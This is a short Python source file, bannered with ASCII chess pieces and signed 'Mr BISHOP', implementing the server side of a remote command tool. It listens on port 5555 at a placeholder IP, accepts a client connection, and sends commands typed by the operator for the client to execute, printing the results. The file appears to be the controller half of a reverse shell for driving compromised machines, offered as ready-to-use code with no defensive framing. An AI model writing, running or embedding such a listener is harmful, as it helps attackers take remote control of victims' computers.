import socket
import subprocess


print("""\

                                                            .::.
                                            _()_       _::_
                                  _O      _/____\_   _/____\_
           _  _  _     ^^__      / //\    \      /   \      /
          | || || |   /  - \_   {     }    \____/     \____/
          |_______| <|    __<    \___/     (____)     (____)
    _     \__ ___ / <|    \      (___)      |  |       |  |
   (_)     |___|_|  <|     \      |_|       |__|       |__|
  (___)    |_|___|  <|______\    /   \     /    \     (    )
  _|_|_    |___|_|   _|____|_   (_____)   (______)   (______)
 (_____)  (_______) (________) (_______) (________) (________)
 /_____\  /_______\ /________\ /_______\ /________\ |________|
                                             __By Mr BISHOP 2023.11.17__
                   ------------------- 

      """)


def start_server():
    host = 'your ip'
    port = 5555

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print(f"[*] Listening on {host}:{port}")

    client_socket, addr = server_socket.accept()
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

    while True:
        command = input("Enter command to execute on the client (or type 'q' to quit): ")
        if command.lower() == 'q':
            break

        client_socket.send(command.encode())
        result = client_socket.recv(4096).decode()
        print(result)

    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()
